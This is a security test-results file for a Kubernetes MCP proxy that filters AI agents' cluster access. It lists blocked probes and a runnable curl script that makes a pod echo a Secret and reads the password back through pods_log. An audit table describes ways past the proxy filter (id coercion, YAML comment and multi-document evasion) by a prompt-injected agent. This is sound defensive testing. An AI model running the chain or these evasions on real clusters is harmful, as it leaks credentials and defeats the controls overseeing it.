# Adversarial test results

Evidence for the security claims in the README: what the policy blocks,
and the one leak chain it provably cannot block *through the rules
file*. Last run **2026-10-10** on minikube v1.39.0 / Kubernetes v1.37.0
(podman rootless driver), `kubernetes-mcp-server` **v0.0.67**, proxy on
`127.0.0.1:3720`, shipped default policy (11 `deny_kinds`, 4
`deny_tools`, `allowed_namespaces: ["default"]`).

The ferret chain below was run with **writes enabled**; the shipped
example now sets `read_only = true`, which refuses step 1 at the
upstream (re-verified in the last section).

Everything below ran **through the proxy** unless marked "direct
`:8081`". Reproduce on a dev cluster you own - the last section creates
a workload and reads real secret material; never run it against a
customer cluster.

## Blocked paths (policy holds)

| # | attempt (via proxy) | observed result |
|---|---------------------|-----------------|
| 1 | `resources_list` `{"apiVersion":"v1","kind":"Secret"}` | `-32000 blocked by kubernetes-mcp-proxy policy: kind Secret is denied by policy` |
| 2 | `resources_create_or_update`, Secret manifest in `default` | `-32000` (manifest sniffed, kind denied) |
| 3 | `pods_exec` | `-32000` (deny_tools) |
| 4 | `configuration_view` | `-32000` (deny_tools, kubeconfig exposure) |
| 5 | `pods_get` in `kube-system` | `-32000 namespace kube-system is not allowed` |
| 6 | `pods_list {}` (all-namespaces lookup) | YAML contains only `namespace: default`; kube-system items filtered out of the response |
| 7 | `namespaces_list {}` | only `default` remains |
| 8 | `resources_list` kind Secret, **direct `:8081`** (proxy bypass) | upstream refuses: `resource not allowed: /v1, Kind=Secret` (`denied_resources` backstop) |

## Confirmed residual: workload ferret chain

The policy governs Kubernetes **API objects**. Data flowing *through
workloads* is outside its reach. This chain was executed end to end;
**no rule fires at any step**:

1. `resources_create_or_update` a Pod in `default` with
   `envFrom: secretRef: postgres-postgresql` - allowed: `Pod` is not a
   denied kind, `default` is an allowed namespace. Creating a pod that
   mounts a Secret needs **no `get` permission on the Secret**; the
   kubelet fetches it. (Mounts are namespace-local: the chain can only
   reach secrets in the pod's own - i.e. an allowed - namespace, which
   bounds the residual to `allowed_namespaces`.)
2. `pods_log` that pod - returns the secret value verbatim:
   `postgres-password=devpass`.

### Reproduce (dev cluster, ~1 minute)

```sh
# 0. a Secret with a known value must exist in an allowed namespace.
#    Bootstrap on any dev cluster (~1 min, pinned chart for reproducibility):
helm install postgres oci://registry-1.docker.io/bitnamicharts/postgresql \
  --version 18.12.4 --set auth.postgresPassword=devpass \
  --set primary.persistence.size=1Gi
kubectl get secret postgres-postgresql -n default -o jsonpath='{.data}'
# -> {"postgres-password":"ZGV2cGFzcw=="}   (devpass)

P='http://127.0.0.1:3720/mcp'; A='accept: application/json, text/event-stream'
SID=$(curl -sS -D - -o /dev/null -X POST $P -H 'content-type: application/json' -H "$A" \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"adversarial","version":"0"}}}' \
  | grep -i '^mcp-session-id:' | tr -d '\r' | awk '{print $2}')
curl -sS -o /dev/null -X POST $P -H 'content-type: application/json' -H "$A" \
  -H "mcp-session-id: $SID" -d '{"jsonrpc":"2.0","method":"notifications/initialized"}'

# 1. create the echo pod through the proxy (allowed kind + namespace;
#    requires writes enabled - the shipped default read_only = true
#    refuses this step, see "Re-verified with the shipped default")
M='{"apiVersion":"v1","kind":"Pod","metadata":{"name":"secret-ferret","namespace":"default"},"spec":{"restartPolicy":"Never","containers":[{"name":"c","image":"busybox","command":["sh","-c","env|sort;sleep 300"],"envFrom":[{"secretRef":{"name":"postgres-postgresql"}}]}]}}'
curl -sS -X POST $P -H 'content-type: application/json' -H "$A" -H "mcp-session-id: $SID" \
  -d "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"resources_create_or_update\",\"arguments\":{\"resource\":$(printf '%s' "$M" | jq -Rs .)}}}"
kubectl wait --for=condition=Ready pod/secret-ferret -n default --timeout=60s

# 2. read the secret back through the proxy
curl -sS -X POST $P -H 'content-type: application/json' -H "$A" -H "mcp-session-id: $SID" \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"pods_log","arguments":{"name":"secret-ferret","namespace":"default"}}}' \
  | sed -n 's/^data: //p' | jq -r '.result.content[0].text' | grep password
# -> postgres-password=devpass

# 3. cleanup
kubectl delete pod secret-ferret -n default
```

## Re-verified with the shipped default (`read_only = true`)

Same stack, **2026-10-10**, after flipping the shipped TOML to
`read_only = true` (the chain above was run with writes enabled):

| attempt (via proxy) | observed result |
|---|------|
| chain step 1: `resources_create_or_update` echo Pod | upstream error `unknown tool "resources_create_or_update"` - `read_only` removes the write tools from upstream entirely (`pods_delete`, `pods_exec`, `pods_run`, `resources_create_or_update`, `resources_delete`, `resources_scale` vanish from `tools/list`) |
| pod exists afterwards | no (`NotFound` from the API) |
| `resources_list` kind Secret | `-32000` (policy, unchanged) |
| `pods_list {}` | only `namespace: default` (0 kube-system lines) |
| `pods_log` on the postgres pod | still allowed - reads are unaffected |

## Ceilings (what does and does not close the chain)

- **Closes it**: upstream `read_only = true` - **now the shipped
  default** - or cluster admission policy restricting secret
  volumes / `envFrom`.
- **Does NOT close it**: any `deny_kinds`/`deny_calls` rules file (no
  denied object is touched); RBAC on the kubeconfig alone (creating the
  pod needs no `get` on the Secret); denying `pods_log` (only hides the
  readback - an echo pod can exfiltrate out-of-band, e.g. `curl`).

## Independent audit (2026-10-11)

A fresh-context adversarial review - no knowledge of the implementation
intent, graded against [THREAT-MODEL.md](THREAT-MODEL.md) - found four
in-scope issues. All were fixed the same day; each has an e2e
regression test (`tests/e2e.sh`, "audit fixes" block), and the stub
upstream now truncates numeric ids like the go-sdk (it used to echo
verbatim, which is why the first bug was invisible to e2e):

| sev | finding | fix |
|-----|---------|-----|
| High | **JSON-RPC id coercion bypass**: the go-sdk echoes numeric ids through int64 truncation (1.5 -> 1); the proxy matched response frames with strict `===`, missed its own frame, and re-emitted it unfiltered - out-of-scope data delivered | numeric ids compared with truncation; any foreign response-shaped frame fails the call closed (-32000); object-shaped request ids refused |
| High | **YAML kind-decoration evasion**: `kind: Secret # comment` (or anchor/tag) did not match the sniffer regex - kind "undeterminable" was forwarded, while the upstream parses the manifest fine | undeterminable kind is refused, never forwarded |
| High | **Multi-document evasion**: only the first `---`-separated document was sniffed; the upstream applies every document (hidden denied kinds / out-of-scope-namespace writes) | manifests split like the upstream; every document sniffed |
| Med | **Namespace depth bug**: a deeper `namespace:` key (e.g. `metadata.labels.namespace`) was read as the object's namespace | `metadata.namespace` accepted only as a direct child of the metadata block |

Severity note: the table grades the **code** against the rubric
(working repro = High). Effective severity on the shipped stack is
lower for three of the four: the default `read_only = true` removes
the write tool entirely (findings 2-4 are unreachable), and with
writes enabled the upstream `denied_resources` backstop still refuses
denied kinds - so only the out-of-scope-namespace variants (a
kube-system document in a multi-doc apply, the namespace-label decoy)
fully land, and only in that relaxed config: integrity of namespace
scoping, not secret disclosure. Finding 1 is the exception that earns
its High: no write, no exotic manifest, default config - one odd
request id silently switched off response filtering for that call.
None of the YAML constructions are reachable by accident (helm,
kustomize, and well-behaved clients never emit a decorated `kind:` or
a hidden second document); they matter because the threat model's
adversary is a prompt-injected agent relaying a crafted string it was
handed - for that adversary, esoteric encodings cost nothing.

## Scope of this document

- Blocked-path probes are non-invasive and safe to re-run anywhere.
- The ferret chain is repo-level e2e for dev clusters only (also
  recorded in the rules skill, which deliberately does not run it).
- Not tested here: multi-tenant hosts (the loopback model assumes a
  single-user machine), node/kernel escapes, vulnerabilities in the
  upstream binary itself.
